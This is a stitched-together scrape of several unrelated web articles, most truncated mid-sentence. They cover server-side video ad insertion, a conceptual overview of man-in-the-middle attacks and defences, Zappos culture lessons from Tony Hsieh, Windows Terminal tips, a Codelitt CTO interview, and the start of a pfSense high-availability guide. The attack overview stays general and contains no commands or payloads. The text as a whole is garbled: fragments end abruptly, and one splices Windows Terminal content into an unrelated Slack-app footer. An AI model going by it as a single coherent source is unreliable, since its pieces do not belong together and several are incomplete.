<ol><li>Before a video (or live transmission) is sent to the transcoders, the stream is decorated with baseband markers called SCTE-104 markers.</li><li>When the encoder compresses the video, it translates the SCTE-104 markers into&nbsp;<a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/SCTE-35" target="_blank">SCTE-35 markers</a>&nbsp;that are carried with the compressed bitstream. These markers indicate the position of ad breaks (apart from other events) in video streams.</li><li>The video is then packaged into&nbsp;<a href="https://ottverse.com/hls-http-live-streaming-how-does-it-work/">HLS</a>/DASH for&nbsp;<a href="https://ottverse.com/what-is-abr-video-streaming/">ABR streaming</a>, and the manifest locations are made known to the CMS so that the player can access them at the time of playback. The manifests also contain information about the ads that need to be played back (the position, URIs, etc.).</li></ol>



<p>Now, let’s take a look at what happens when the user presses play on his device. </p>



<ol><li>The user presses “play” on his device to begin video playback. Typically, the player will contact the CDN to get a copy of either the HLS or DASH manifests to start the playback session. However, in SSAI, it will typically get the manifest from the ad-insertion service that stores the video manifest after decorating it with ad-related information. </li><li>When the player asks for the manifest, it will (typically) also provide some information about itself (i.e., the viewer’s location, subscription-levels, etc.) to enable personalized ad-delivery. Players generally provide the “<strong>X-Device-User-Agent</strong>” and “<strong>X-Device-IP</strong>” HTTP headers, as per the IAB VAST guidelines. Additional data can be provided if the player is set up to do so by the SSAI vendor.</li><li>When the ad-insertion service detects that an ad-marker is reached or is coming up, it contacts the&nbsp;<strong>Ad Decisioning server</strong>, whose duty is to supply the ad for insertion.</li><li>The Ad Decisioning Server then uses various bits of information such as the data sent from the player at the start of the playback session, ad campaigns, etc., to get an ad out of the inventory and pass it on to the Ad Insertion server.</li><li>The Ad Insertion server then transcodes the ad to match the video’s bitrate ladder, packages, and produces a manifest for the ad, and stitches the ad’s manifest into the video’s manifest.</li><li>When the player gets this refreshed manifest, it seamlessly delivers the ad as if it were delivering any other video! After the ad completes, the video player continues playing the content without any interruptions or breaks.</li><li>Apart from this, the player can be modified to report on the ad playback to ad-tracking services. i.e., client-side reporting for server-side ad insertion.</li></ol>



<p>I hope by now you’ve understood how both CSAI and SSAI work. Obviously, they have their own advantages and disadvantages. In the next section, let’s take a look at these in detail.</p>

<h2>Differences between CSAI and SSAI : Pros and Cons</h2>



<p>After understanding how CSAI and SSAI work, let’s take a look at the big differences between each of these approaches and the pros and cons as well. </p>

<h3>Pros of CSAI </h3>



<ol><li>CSAI provides a lot of options for <strong>dynamic, rich-media ad</strong> experiences using <a href="https://ottverse.com/what-is-vpaid-video-player-ad-interface-definition/">VPAID (deprecated)</a> and SIMID. Publishers and Advertisers can create rich experiences (like surveys, click-throughs, overlays, etc.) using traditional client-side ad serving technologies.</li><li><strong>Rich tracking and metrics</strong>: It is quite easy to set up very detailed tracking in the case of CSAI. Using the VAST XML, players can report on the quartiles of completion, clicks, click-throughs, etc. providing a lot of data for ad-tracking services. </li><li><strong>Highly-personalized ads</strong>: using a plethora of data sources and information, highly personalized ads can be served using CSAI technology. </li></ol>







<h3>Cons of CSAI</h3>



<ol><li><strong>Latency</strong>: the life of CSAI starts with the player requesting an ad-server for an ad and then waiting for that ad to be delivered. This inherently induces latency and can frustrate the viewer. </li><li><strong>Buffering</strong>: inherently, the ad is served from a different origin than the video in the CSAI paradigm. If the ad-server is not well-tuned and the video player does not request the correct bitstream (if the ad was transcoded into multiple variants), then the ad can start buffering which will surely frustrate the end-user. </li><li><strong>Ad Blockers</strong>: it is common to see ad-blocking technology in browsers preventing ad playback causing a loss of revenue for the publishers and advertisers. The player has to make explicit API calls to ad servers, pause video playback, and start ad playback. Using this information, ad blocking technology can easily block ad playback. </li><li><strong>Heavy on the client</strong>: Because the client has to treat an ad differently from a video, the work of the client increases and so does the size of its code-base. If you add tracking code to such clients, then the size increases even more. Furthermore, ad tech vendors have to also support a wide range of clients (HTML5, Android, iOS, Roku, gaming consoles, etc.) to ensure that their customers can get revenue from all their platforms. </li><li><strong>Variable video quality between content and ads.</strong>: since the ad inventory is not necessarily matched with the content in terms of bitrates, and resolutions, it is possible that the quality of the ad and the video can differ causing a poor user …</li></ol></div></div></article></main></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Cyber threats seem to be everywhere in this digital era. Viruses, malware, ransomware, trojans, phishing and a lot more make a never ending list of cyber threats. But one of the most prevalent threats out there that often gets overlooked is manipulator-in-the-middle (previously referred to as ‘man-in-the-middle’) attack.</p><p>While using the internet, we expect our communications to be confidential and not to be changed or tampered while in transit. When you are submitting some sensitive data to a web application, you rely on the assumption that:</p><ol><li><p>everything you have entered is valid,</p></li><li><p>all the data reaches the server in its correct form, and</p></li><li><p>third parties cannot see, intercept or change your data.</p></li></ol><p>But the fact is that a man-in-the-middle (MITM) attack breaks either one of the last two assumptions or both.</p><p>If the connections you make to websites and online services are not secure, you could be vulnerable to security risks such as phishing, fraud, impersonation, malware, and many others.</p><h2 id="the-beginning-and-the-present">The Beginning and The Present</h2><p>Intercepting and altering communication has happened for centuries, and the advent of the internet and further development has made it easier than ever for criminals to inject their interests into private transmissions.</p><p>During the late-16th century, letters related to an assasination plot against Queen Elizabeth I of England by Mary Stauart and her fellow conspirators were intercepted, decoded and modified by a cryptography expert named Thomas Phelippes. This happens to be one of the earliest MITM attacks on record.</p><p>In 2018, Russian spies attempted a MITM attack on the headquarters of the Organisation for the Prohibition of Chemical Weapons (OPCW).</p><p>In 2019, the national government of Kazakhstan attempted to introduce an internet surveillance system. The goal of the State security officials was to protect Kazakh users from hacker attacks, online fraud and other kinds of cyber threats. The certificate allowed users’ traffic to be intercepted by the government, circumventing encryption used by email and messaging applications.</p><p>Recently, the personal data of more than 12,000 Indian blood donors were on offer on the clear web for free. It was found by risk monitoring firm CloudSEK.</p><p>The leak might have been possible because of an unsecured HTTP site that was intercepted by third parties or an exposed database or cloud storage bucket, or even a phishing campaign that succeeded in accessing system admin credentials.</p><p><img src="https://beaglesecurity.com/blog/images/resized/blogmim.png-40da136/800x494.png" srcset="https://beaglesecurity.com/blog/images/resized/blogmim.png-40da136/810x500.png 810w, https://beaglesecurity.com/blog/images/resized/blogmim.png-40da136/750x463.png 750w, https://beaglesecurity.com/blog/images/resized/blogmim.png-40da136/800x494.png 800w" sizes="(min-width: 1029px) 600px, 100vw" alt="Respondcr"></p><p>MITM attacks usually take two forms:</p><p>The first is where an adversary may want to read the content of a message which is often said to be an attack on confidentiality.</p><p>The second would involve the adversary changing the content of the message or otherwise modifying the communication which is said to be an attack on integrity.</p><p>Man-in-the-middle attacks involve the physical proximity to the intended target or it involves a malicious software or malware. For example, the client or user receives a mail which includes a link to a bank site, from the “man-in-the-middle“ or the attacker which appears to be a legitimate one.</p><p>When you click on the link and log in, you are actually passing your credentials and data to the attacker. And this type of attack includes phishing also.</p><h2 id="types-of-man-in-the-middle-attacks">Types of Man-in-the-Middle Attacks</h2><p>A MITM attack is essentially an eavesdropping situation in which a third party or an adversary secretly inserts itself into a two-party conversation to gather or alter information. MITM attacks can affect any communication exchange, including device-to-device communication and connected objects (IoT).</p><p>Generally, man-in-the-middle attacks can be categorized into two:</p><h3 id="active-session-attack">Active session attack</h3><p>During an active session attack, the attacker stops the original client from communicating with the server and then replaces himself within the session.</p><p>From this point onwards, the attacker will be communicating with the server and he will be able to do anything that a normal user can do. He could tamper the data or collect sensitive information that may have a potential impact later.</p><h3 id="passive-session-attack">Passive session attack</h3><p>In a passive session attack, the attacker monitors the data flowing across the network without interrupting the actual communication. The intruder eavesdrops the communication but does not modify the message stream in any way. He could collect all the data passing through the network which may cause an active attack later.</p><h2 id="techniques-used-in-man-in-the-middle-attacks">Techniques Used in Man-in-the-Middle Attacks</h2><p>Some of the common man-in-the-middle attack techniques used are:</p><h3 id="rogue-access-point">Rogue Access Point</h3><p>A rogue access point is a device that is operating on the network without the authorization of an administrator, posing a security threat. They are set up to trick computers that automatically connect to Wi-Fi by posing as legitimate public networks. These rogue networks often monitor traffic and steal sensitive information.</p><p>The attacker could use this rogue access point as a public Wi-Fi of a coffee shop to control and intercept every communication passing through that network.</p><h3 id="address-resolution-protocol-arp-spoofing">Address Resolution Protocol (ARP) Spoofing</h3><p>ARP is a communication protocol used to find out the MAC address of a particular device whose IP address is known. If a device wants to communicate with another device on the network, then the sending device uses ARP to find the MAC address of the device that it wants to communicate with.</p><p>And these ARP packets can be forged to connect with a device as a legitimate one which is referred to as ARP spoofing.</p><p>This allows the attacker to intercept, modify, and drop the incoming messages.</p><p>MITM by ARP spoofing is done by exploiting two security issues. The first security issue is that each ARP request or response is trusted. As every request and response is trusted, you can just tell any device that’s on your network that you’re the router and that allows further communication.</p><p>The second one is that the clients can accept responses even if they didn’t send a request. Ultimately, you can respond to them as you are the router and could connect with them without the device sending any request.</p><h3 id="domain-name-system-dns-spoofing">Domain Name System (DNS) Spoofing</h3><p>Domain Name System (DNS) spoofing is a technique that tricks a user to a bogus website rather than the real one the user intends to visit. The website will appear to be the real one and you may think you’re visiting a safe, trusted website when you’re actually interacting with a fraudster. The attacker’s goal is to divert traffic from the real site or capture user login credentials and other data.</p><p>DNS spoofing is done by replacing the IP addresses stored in the DNS server with the ones under the control of the attacker.So, whenever a user tries to access a particular website, they get directed to the malicious website placed by the attacker in the spoofed DNS server.</p><h3 id="email-hijacking">Email Hijacking</h3><p>Email hijacking happens when attackers compromise and gain access to a user’s email account and watch communications to and from the account.</p><p>When an opportunity arrives, for instance, if the user is exchanging funds or any other data with another party, the attacker takes advantage of the situation by attempting to intercept the funds and transfer it to their own accounts.</p><p>Attackers can also use the email to take over other online accounts tied to the email account.</p><h3 id="internet-control-message-protocol-icmp-redirection">Internet Control Message Protocol (ICMP) redirection</h3><p>ICMP is used by network devices, like routers, to communicate with the source of a data packet about transmission issues. For example, it might report to the host that a requested service is not available or that a host or router could not be reached.</p><p>In order to establish a successful MITM attack, the attacker looks for the network hosts that are down. When these hosts are pinged by other nodes in the network, the attacker will respond to them by sending a successful ping message.</p><p>And in this way, the attacker can forge ICMP-redirect packets in order to redirect traffic to himself which eventually results in gathering all data passing through it.</p><h3 id="dynamic-host-configuration-protocol-dhcp-spoofing">Dynamic Host Configuration Protocol (DHCP) spoofing</h3><p>DHCP dynamically assigns IP addresses. In DHCP spoofing, an attacker’s computer is issued as a DHCP server and sends forged DHCP acknowledgments to any connecting nodes.</p><p>The attacker can supply its own IP address for the default gateway address or DNS server in forged DHCP requests hence executing a man-in-the-middle attack.</p><h3 id="ssl-stripping">SSL stripping</h3><p>SSL/TLS is a secure cryptographic protocol used to communicate sensitive information. The protocol’s security is established by creating an encrypted connection between two parties.</p><p>When a user enters a domain name or when an unsecured HTTP request is sent, the server responds via HTTP and then redirects the user to HTTPS.</p><p>The user then sends a secure HTTPS request, and the secure session is initiated. In order to strip the SSL, the attacker intervenes in this redirection of HTTP to HTTPS and allocates himself between the server and client. While the victim and attacker will be in an unsecured connection, the attacker maintains an HTTPS connection with the server.</p><h2 id="how-to-prevent-man-in-the-middle-attacks">How to Prevent Man-in-the-Middle Attacks</h2><p>MITM attacks can be detected or prevented by two means: authentication and tamper detection.</p><h3 id="authentication">Authentication</h3><p>Authentication provides a degree of certainty that a given message has come from a valid source. A public key infrastructure, such as TLS, can harden Transmission Control Protocol (TCP) against MITM attacks.</p><p>Implementing multi-factor authentication, pre-shared key authentication or certificate-based authentication makes it difficult for attackers who intercept messages to decrypt them, or construct fake messages for communicating with others.</p><h3 id="tamper-detection">Tamper Detection</h3><p>Tamper detection checks whether a message has been altered or not and ensures that the data is safe from corruption. This checks the integrity of the message by comparing the equivalent hash of the message sent by one user to the other one which can also be encrypted.</p><h2 id="best-practices-to-stay-safe-from-man-in-the-middle-attacks">Best Practices to Stay Safe from Man-in-the-Middle Attacks</h2><p>It is rarely possible for those affected to recognize whether a man-in-the-middle attack has …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main><p>Personally, I didn't know Tony or his previous history until my Tweeter feed got filled with the sad news about his death. It took me some time to learn more about Tony and his impact on our world today. After doing my research, I came to a conclusion: most of the companies today are totally missing out on creating a strong team culture. So, here are some key things that I was able to extract from numerous interviews and talks with Mr. Hsieh.</p><h2>What is your bad culture experience?</h2><p>Before Zappos, Tony was running a startup called LinkExchange. It was sold to Microsoft. Tony's reason for the exit was bad team culture. Tony admitted to this, and used it as a motivation to create a great team culture at Zappos. You can think about your own bad employee experience. What sucked for you at your first job? Perhaps you still have similar problems at your current company. Can you find a fix for them?</p><figure><p><img alt="notion image" src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff1d3c31c-1fcf-4309-b409-96d87ba41b57%2Fgift-habeshaw-Of8C-QHqagM-unsplash.jpg%3Ftable%3Dblock%26id%3Dc1b66b9d-f244-4e54-b77c-903224bb7d4d%26width%3D1000%26userId%3D%26cache%3Dv2?table=block&amp;id=c1b66b9d-f244-4e54-b77c-903224bb7d4d&amp;cache=v2"></p></figure><h2>Focus on your employees as much as on your customers.</h2><p>Don't forget that people who are on-board with your vision have their own dreams and aspirations. Try to think of ways you can make their job more enjoyable. For example, Zappos employees claim that they make decisions on their own. How great does that sound?</p><h2>Give Freedom to your employees.</h2><p>No micromanager will admit they micromanage. Maybe you should always assume that there's some micromanagement involved. So how will you create the type of environment where your team doesn't get told what to do yet still  achieves needed results? At Zappos, Tony was able to create this atmosphere. The customer support team doesn't have scripts. Their whole aim is to help people. They act based on principles and not direct tasks.</p><h2>Your focus should be your customer not your product.</h2><p>While Zappos started as an online shoe store, Tony said that they want to be much bigger than that. At the core of his company he preached to focus on customer and satisfy their needs instead of improving the product. At Zappos, the whole strategy was to ignore advertising as their growth channel and instead think about how customer service can be improved. This approach led to great sales results and mutual understanding inside of Zappos on what matters.</p><h2>Think creatively about your hiring.</h2><p>Zappos hires based on 2 fits. Fit for the hiring position and fit for the culture. After an interviewee is determined to be a great fit, Zappos offers them something very intriguing. A new hire has a chance to get paid for the training, plus a $3000 bonus if they reject the hiring offer. That way the people who accept the job feel more committed. Only about 2-3 percent of people take that offer. It's a great bargain for the company to onboard people who are there for the right reason and not just a paycheck. </p><h2>Don't start a brand, start a philosophy.</h2><p>The Zappos team created a set of 3 things that are essential for the brand: <b>Clothing, Customer Service, Culture. </b>By putting it all together, they have realized that Zappos is about <b>delivering happiness</b>. That's a genius way to distill your mission.</p><blockquote>“People may not remember exactly what you did, or what you said, but they will always remember how you made them <b>feel</b>”</blockquote><figure><p><img alt="notion image" src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0f41dc6c-adcd-40ca-ab18-1b4ce5cad667%2Flex-sirikiat-YlHhljkuEFE-unsplash.jpg%3Ftable%3Dblock%26id%3D5739c1c5-491c-474e-8773-e6048a565e56%26width%3D1000%26userId%3D%26cache%3Dv2?table=block&amp;id=5739c1c5-491c-474e-8773-e6048a565e56&amp;cache=v2"></p></figure><h2>Hire, promote, and fire based on culture values not on performance.</h2><p>It's up to you to decide what your company values are, but you should have them set. For Zappos, one of them is being humble. Turns out it's not easy to ask people about this value while hiring. The response won't be very accurate. To fix this issue, Zappos came up with a pretty smart way to uncover the truth. Since a lot of job applicants are out of town, Zappos hires a driver that picks them up from the airport. After the interview done, a driver is asked how the job applicant was treating them. If the driver says "bad", it doesn't even matter how good the interview was.</p><h2>Core values don't matter, committing to them does.</h2><p>Tony said that he took this idea from nature by looking at flying birds. As they fly they look like one organism. Birds do have very simple rules while traveling. Have some distance from the bird to the left, have some distance from the bird to the right. They are not guided by one main bird that tells them what to do. Those simple rules are just like your company culture principles. Commit to them and your team will be united. That's how Zappos was able to scale their team culture.</p><figure><p><img alt="notion image" src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe8254a5a-318a-475d-98ed-82ba113c641d%2Fvincent-van-zalinge-fiQ7YrVFPqs-unsplash.jpg%3Ftable%3Dblock%26id%3De99a523c-7963-4a1e-bc7e-3e520e7c7746%26width%3D1000%26userId%3D%26cache%3Dv2?table=block&amp;id=e99a523c-7963-4a1e-bc7e-3e520e7c7746&amp;cache=v2"></p></figure><h2>Chase the vision not the money.</h2><p>Even though it might sound obvious, Tony is very convinced about this idea. He was often being asked about what industry to enter to make a giant pile of money. This response was standard. Focus on problems and customers that you like the most. Money will follow. After selling his first startup, he was able to invest in dozens of startups. It was his choice to join Zappos. Without his love for the customer service, he wouldn't achieve such result. </p><blockquote>“Don't chase the paper- chase the dream” — P. Diddy</blockquote><h2>Rediscover your Happiness.</h2><p>Even though Tony left the world on a sad note, he was standing firm on the idea that we should focus on happiness. By happiness he didn't mean running after every pleasure but rather fulfilling purpose. I guess we should take a lesson from that and apply it to what we do. </p></main></div></div><div id="article-bottom"><hr><div><p><h2>Looking for new ways to stay connected with your team?</h2></p><p>Bill is a Slack app that helps your team get to know each other better using fun icebreaker games.

It’s packed with useful features like <abbr>GPU</abbr> acceleration, tabs, panes, themes, and shortcuts, along with full support for different environments such as PowerShell, Command Prompt, and <abbr>WSL</abbr>. In this article, I’ll describe a few ways to tailor the terminal experience to your needs along with tips and tricks to make development much easier.</section></div><div><article><p>The <a href="https://www.microsoft.com/en-ng/p/windows-terminal/9n0dx20hk701?rtc=1">Windows
terminal</a>
app is available on the Microsoft Store. If you open the store and search for
“Windows terminal”, it should be the first item on the list. It’s also available
on its <a href="https://github.com/microsoft/terminal/releases">GitHub releases page</a>
but you miss out on automatic updates. You can also install the <a href="https://www.microsoft.com/en-ng/p/windows-terminal-preview/9n8g5rfz9xk3?rtc=1&amp;activetab=pivot:overviewtab">Preview
version</a>
if you want to be on the bleeding edge of features.</p><figure><img width="1000" height="614" src="https://ik.imagekit.io/freshman/windows-terminal-1_Plzau63iDjBr.png" alt="Microsoft store showing Windows Terminal"></figure><p>Once installed, launch the terminal. The interface is quite straightforward with
tabs at the top and a dropdown menu for switching between the different
profiles.</p><figure><img width="1000" height="543" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-2_C-8vd45l6De8.png" alt="Windows terminal default view"></figure><p>You can open the Settings through the dropdown menu or by pressing <kbd>Ctrl +
,</kbd> on your keyboard. The terminal settings is managed through a
<abbr>JSON</abbr> file which will open in your default app for <abbr>JSON</abbr>
files.</p><figure><img width="1000" height="622" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-3_Xy74THOC14wLv.png" alt="Visual Studio Code showing the default settings for the Windows terminal"></figure><h2 id="launch-the-terminal-with-a-keyboard-shortcut">Launch the terminal with a keyboard shortcut</h2><p>The easiest way to bind the Windows terminal to a keyboard shortcut is to pin it
to the task bar and press the <kbd>Win</kbd> key plus the number corresponding
to the position of the program on the taskbar. For example, <kbd>Win + 3</kbd>
launches or focuses the terminal window on my computer.</p><figure><img width="977" height="240" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-6_Yav5vjNpV.png" alt="Windows taskbar showing position of Windows terminal"></figure><p>If you have <a href="https://www.autohotkey.com/">AutoHotkey</a> installed, you can run or
raise a Windows terminal instance with the help of <a href="https://gist.github.com/atruskie/99a498ac43b91deb91eab4069b6047b9">this
script</a>. All
you need to do is:</p><ul><li>Create a new text file with a <code>.ahk</code> extension.</li><li>Copy and paste the above script into the file.</li><li>Double click the file to run it.</li></ul><p>Once that’s done, you’ll be able to bring up the Windows terminal with a
keystroke. The linked script uses <kbd>Win + `</kbd>, but you can change it to
your preferred key binding. Instead of running the script manually everytime,
you can follow these
<a href="https://www.autohotkey.com/docs/FAQ.htm#Startup">instructions</a> to make it run
automatically on system startup.</p><h2 id="launch-the-terminal-from-windows-explorer">Launch the terminal from Windows Explorer</h2><p>You can launch the Windows terminal from the File Explorer by typing <code>wt</code> and
<kbd>Enter</kbd> in the address bar. This will launch a new terminal window in
your default user directory. To specify the current directory instead, use <code>wt -d .</code>.</p><figure><img width="1000" height="527" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-11_-lLtY9E28.png" alt="File explorer showing Windows Terminal command"></figure><p>Additionally, you can right click on a directory in File Explorer and select
“Open in Windows Terminal”. This will launch Windows Terminal with your default
profile in the selected directory.</p><figure><img width="1000" height="731" loading="lazy" src="https://ik.imagekit.io/freshman/windows-terminal-24_zKfCLgSUma4I.png" alt="File explorer showing Launch in Windows Terminal option"></figure><h2 id="change-the-default-profile">Change the default profile</h2><p>The default profile is what appears when you open the Windows terminal or a new
tab. By default, it’s a profile for Windows Powershell. If you prefer to work in
a Linux distribution, it may be more convenient to change the default profile to
your preferred <abbr>WSL</abbr> profile. To do so, update the value of the
<code>defaultProfile</code> property in the <code>settings.json</code> file with the <code>guid</code> of your
preferred profile.</p><figure><figcaption>settings.json</figcaption><div><pre><code data-lang="json"><span>{</span>

pressing <kbd>ctrl + tab</kbd> or <kbd>ctrl + shift + tab</kbd> will switch tabs in a
similar manner to web browsers. If you want to control the order of the tabs in
the tab switcher, you can set <code>tabSwitcherMode</code> to <code>mru</code> or <code>inOrder</code> which will

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="Post__Main-Content">
        <div>
          <p><strong>Hey Kaio! Thanks for taking the time to talk with me about your journey! To start, why don’t you tell me about yourself!</strong></p><p>I’m originally from <a href="https://www.google.com/maps/place/Goi%C3%A2nia+-+State+of+Goi%C3%A1s,+Brazil/@-11.7982607,-55.4825581,4.56z/data=!4m5!3m4!1s0x935ef0ede1248cf7:0xbaedffbfd0c11fd1!8m2!3d-16.6868982!4d-49.2648114">Goiânia, Goiás, Brazil</a> but currently live in a small city called <a href="https://www.google.com/maps/place/Palmas,+State+of+Tocantins,+Brazil/@-11.6859599,-50.3391487,6.56z/data=!4m5!3m4!1s0x933b3439911f1257:0x93b8070d05c818f!8m2!3d-10.249091!4d-48.3242858">Palmas</a>. Well it’s small by Brazil standards, it’s no São Paulo (12 million people) - there are about 400,000 people here. When I first arrived I only had my bike with me, I really like biking so I thought it would be all I’d need, but everything is pretty spread out so I now have a motorcycle as well.</p><p>For fun, I’m always reading plus... <em>something else</em>; for a while this was dancing. I learned 4-5 kinds of ballroom dancing, tango, zouki, forró and, of course, Brazil’s popular <a href="https://www.youtube.com/watch?v=CimlZ1Vaqzc">samba!</a> At some point I realized that I wanted to fight more than I wanted to dance so I started training in jiu jitsu!</p><p><strong>Hah! A bit of a change!</strong></p><p>Yes, I’ve been doing it for 3 years. After practicing on a daily basis, I can tell you the best defense is to run! Always try to run first in a bad situation, you never know the other person’s intentions, if they have a weapon, or what their training is.</p><figure><img src="https://res-3.cloudinary.com/hepw4b4yn/image/upload/q_auto/v1/ghost-blog-images/hobbies-kaio.jpg"></figure><p><strong>Great advice! So that’s your “something else” right now, but what do you like to read?</strong></p><p>I read a lot of different things. I’ve always read fantasy, but lately it’s been more “reality-related” stuff - a lot about leadership (like, <em>a lot</em>) or books that have communication as the main topic. <a href="https://www.amazon.com/Extreme-Ownership-U-S-Navy-SEALs/dp/1250067057">“Extreme Ownership”</a> by Jocko Willink and Leif Brabin is one of my favorites. Jocko has a podcast that I listen to as well and he talks about a book in almost every episode.</p><p>I’ve also been reading a lot of war-related books. They’re very interesting even though they get in the way of my sleep. It’s quite hard to sleep after you read about the ugly stuff of war! Though it doesn’t affect my dreams. The only fighting that happens in my dreams is jiu jitsu - I <em>always</em> wake up right after I get a hold locked on my opponent. Always!</p><p><strong>So you’re the CTO. How do you describe what you do here at Codelitt?</strong></p><p>The shortest description is: my job is to make sure that everyone on the engineering team has what they need to succeed in their tasks. Since I'm no longer a full-time engineer (although I work with engineering as much as I can) my goal is to make sure my team has all the resources they need. </p><p>So yes, I’m the CTO, but in the tech world my role goes by a lot of different names. It’s kind of a hybrid of management and engineering. At the end of the day a person in my position is leading, but I also have to be in the trenches to ensure that the quality of the output is something that I myself would be proud of.</p><p><strong>How did you end up in software engineering?</strong></p><p>I’ve always loved technology. I got my first computer when I was 11 years old. I like to say that I “never really left the chair” even though I grew up with my mom telling me that I’d lose the use of my hands if I worked on the computer all day. </p><p>For university, I was initially focusing on Biological Sciences but 2 years in when I was 19 years old I made the switch to software engineering. I used to think these two were <em>totally</em> different, but I realized that a lot of areas, ecology and DNA work for example, are very mathematical in their approach. Also I saw that there were some lessons in biology, like the importance of naming and classification, that are also key in software engineering. We try and fail miserably in engineering, but we’re getting there! </p><p><strong>What made you switch?</strong></p><p>I became frustrated that I had to go through an entire course to properly work in the biology market. I could do some internships, but they were pretty limited. I also looked into the future and didn’t like the idea of doing research for the university. I believed that the idea was to write <em>papers </em>instead of getting <em>results.</em> There seemed to be too much focus on getting points academically than producing quality output, you know, to be promoted at the university it is about research points, not research results.</p><p>Software engineering also gave me the freedom to work <em>where</em> I wanted to. I didn’t have to be in a lab to work. I could use my <em>reasoning </em>to solve problems and get results - I didn’t need something physical, a specimen, to solve a problem. When we studied substances and their effects on rats, we had to go to the lab. I realized I’d rather get the problem that I was supposed to solve and then go off somewhere to think about it.</p><p>I’m also a big fan of small victories. You know, the really small things that add up at the end of the day. You can have this in biology, but every advancement is pretty huge since we know so much at this point. With software engineering, you can literally create anything out of thin air. Goals are only limited by <em>time</em> and not by any <em>physical</em> resource. </p><figure><img src="https://res-5.cloudinary.com/hepw4b4yn/image/upload/q_auto/v1/ghost-blog-images/hobbies-kaio-1.jpg"></figure><p><strong>I like that! So how did you find Codelitt? </strong></p><p>So before I started with Codelitt I was working for a tech company in Goiânia. At this point, I had already been studying software engineering for a while. I made up my mind to find the top engineer within my company so I could find out what makes them the best at what they do. This person was Bruno! He would later go on to become the CTO.</p><p>A year or so after I met him, Bruno and I had teamed up to lead an effort to create a new product for the company and started discussing the idea of working remotely. One thing I noticed was that there were a lot of positions looking for Ruby engineers, so I teamed up with him to learn it - although he knew quite a lot of it already. We both decided to start looking for remote jobs with US based companies. It was actually Bruno that found Codelitt first!</p><p>So before Bruno started working as Codelitt’s CTO, I reached out to him to see if there were any open source projects that I could work on after I’d finished with my day job. For me it was all about practice and the chance to get some more experience. Luckily Bruno said, yes there was a project!</p><p>This project was actually the side project for Cody, Codelitt’s Founder, so I had the opportunity to meet him briefly. A few weeks later, Bruno sent me a screenshot of a Slack conversation where Cody was asking Bruno if he “knew this guy Kaio” because they needed a Ruby developer. I was so happy.</p><p>I was initially offered a contract job for 3 weeks. Cody made sure this assignment was super clear for me saying something like, “Hey this is the deal - we only have work for 3 weeks. I just want to make sure you understand that if you leave your job for this, then in 3 weeks you won’t have a job anymore.” </p><p>This was the first opportunity to work remotely <em>and</em> for the US. It was huge for me! I was <em>terrible </em>at English, though. Like seriously, at one point during the interview Cody said, “Hey Bruno you can continue the interview in portuguese and just let me know what you think.” Honestly though, as soon as I received the screenshot from Bruno I knew I was going to say yes!</p><p>With Bruno being the CTO of Codelitt, I had a lot of responsibilities that I wouldn’t normally have had as a junior developer. He was working side by side with the CEO. Career-wise, it was great for me. </p><p><a href="https://www.youtube.com/watch?v=jwG_qR6XmDQ">Jeff Bezos calls it “regret minimizing”</a>. The idea comes from the question “What will you regret - doing something or <em>not</em> doing something?” If I hadn’t taken the opportunity I know, then I would have regretted it.</p><p><strong>What are some of the big differences between then and now?</strong></p><p>First thing that comes to mind is the size. I first joined as a contractor and at that time this meant I only had contact with the people that I <em>needed </em>to have contact with: the CTO and COO. We were a total of 7 people then and today we’re 35-40 people typically. Back then the engineering team was only 3 people and more often than not we were working on the same project together.</p><p>The amount of projects that we manage at the same time is different too. In the early days it was no more than 2-3. It took a while to run 4 projects. Now we’re much more efficient.</p><p>The third biggest difference is communication. In the beginning, communication was easy with so few people and projects. It was almost too easy! Back then, I had direct access to the CTO. You know, I didn’t have to run a question to HR. Anything project-related I ran to the CEO! &nbsp;Now it’s very different.</p><p><strong>What are some of your favorite memories or favorite projects that you’ve worked on? </strong></p><p>I think about this a lot - I have a lot of good memories. With projects, we always have something new which is always fun. In the beginning, it would often be only myself and another developer on a project, most of the projects in my first two years were like this.</p><p>I’d say my favorite project was my first project. </p><p><strong>Why?</strong></p><p>It was the hardest thing I’ve ever done. I don’t think I’ve ever worked so hard in my life. I mean, I’ve probably worked harder on other projects in recent years but I’m stronger than I was then. It’s like a guy going to the gym the first time and trying to lift. It was the first project that I owned fully - pages, process, etc. - I was the one developer tasked with building <em>everything </em>the user will see. Working together with the CTO was huge because he was able to provide me with a ton of technical help. I wasn’t as good as someone should be for this project, so I had to work <em>extra </em>hard for it.</p><p>On a common day, I worked 14 hours. Between Aug 1st and Oct 11th I worked 7 days a week, 14 hours a day. I may have taken two Sundays off, but I still worked 6 hours. That was a “day off” for me. </p><p>I mention that not because I think it was good. It was NOT healthy. Nowadays I would <em>never </em>accept working like that again. It was a “high cost” experience because it’s not just about the time spent working, it’s also about mental health. At one point I remember getting to my desk and seeing 5 empty cans of Red Bull. Sometimes I’d go to bed at 12am and wake up at 4am. </p><p>It was a great experience because it showed me how far I could go.</p><p>Although I’d love to say that I was up for continuing on like this if needed, I wasn’t. On Monday Oct. 11th I had it in my mind that I didn’t have the ability to continue working …</p></div></section></div>

<p>In this article, we will see how to configure two pfSense servers in cluster mode to ensure high availability service.</p>



<p>pfSense is one of the few open-source solutions offering high-availability techniques.</p>



<h2>Network Diagram</h2>



<div><figure><img src="https://www.provya.com/blog/wp-content/uploads/2020/10/network-diagram-high-availability-cluster-pfsense-provya.png" alt="" srcset="https://www.provya.com/blog/wp-content/uploads/2020/10/network-diagram-high-availability-cluster-pfsense-provya.png 580w, https://www.provya.com/blog/wp-content/uploads/2020/10/network-diagram-high-availability-cluster-pfsense-provya-294x300.png 294w" sizes="(max-width: 580px) 100vw, 580px"><figcaption>[pfSense] Network diagram</figcaption></figure></div>



<p><span>LAN</span>:</p>



